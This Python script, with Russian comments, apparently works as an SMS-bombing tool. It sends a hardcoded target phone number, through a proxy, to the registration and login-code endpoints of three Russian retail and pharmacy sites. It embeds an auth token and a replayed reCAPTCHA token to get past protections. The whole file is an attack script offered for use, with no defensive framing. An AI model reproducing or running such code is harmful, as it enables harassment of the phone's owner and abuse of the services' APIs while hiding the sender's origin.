import requests
import time

# print("Введи номер телефона без кода страны")
# phone=input()
# print("Номер телефона " + phone)
phone = '9991253348'
ts = 5
ipPort = "45.80.47.205:8080"
proxy = {"https": "https://" + ipPort}
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
    "Content-Type": "application/json", }


# прокси


def pyaterka():
    pPhone = "+7" + phone
    pyaterkaHeaders = headers
    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
                            "Origin": "https://5ka.ru"})
    p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                      proxies=proxy)
    print(p.status_code)
    print(p.json())


def karusel():
    karHeaders = headers
    karHeaders.update({"Host": "app.karusel.ru", "Origin": "https://karusel.ru"})
    karPhone = "7" + phone
    kar = requests.post("https://app.karusel.ru/api/v2/token/", headers=karHeaders, json={"phone": karPhone,
                                                                                          "recaptcha_token": "03AGdBq255xknZF1jMw1N-O4w36uvaeyqFAeYk2x2MhYiDnLs31jnWYboOi1evSLHIrL7JSzXYjesrWMhv5sxvt2hJfEM2N3AXeAKjD135PpocJiEmrYWConWAg2XRGzUZp_rX-FgIoq2Y7qCyBcIdx1CW4KLzh6X_Xk2NvV3-F7L2jynBvXJNmpRL7DBsZZ5xCxLs4JYSfZS4UmPhd0yE-wGIgUtHb4Dz74PSCk61LJg8_bfpB-uo8xoEdgiCg6MeiPPWBjtCqZC_nBF-2zY93Vd64PQd7gAc4aJTd2O7iqGnKEdTPDvUex0B0sI2oHUNJ0m1Ggr0z3C9OWEPtr7l7S3zrgbiH7PZHtWbiuM2Y_VVPxs4aCedXDOWPF1kZ_EuZWYAhCN0iIwGrgJkHPnKl22HfyU149kpK1dTlz_fL_4BeJozTwv0atHwRbjGxYb7youdKp8fJmKe"},
                        proxies=proxy)
    print(kar.status_code)
    print(kar.json())


def aptekaru():
    aptHeaders = headers
    aptHeaders.update({"Host": "api.apteka.ru", "Origin": "https://apteka.ru", "cityId": "5e57803249af4c0001d64407"})
    aptPhone = "+7" + phone
    apt = requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d644070", headers=aptHeaders,
                        json={"phone": aptPhone, "u": "1"}, proxies=proxy)
    print(apt.status_code, "aptekaru")
    print(apt.json())

time.sleep(ts)
time.sleep(ts)
pyaterka()
time.sleep(ts)
aptekaru()
time.sleep(ts)
karusel()
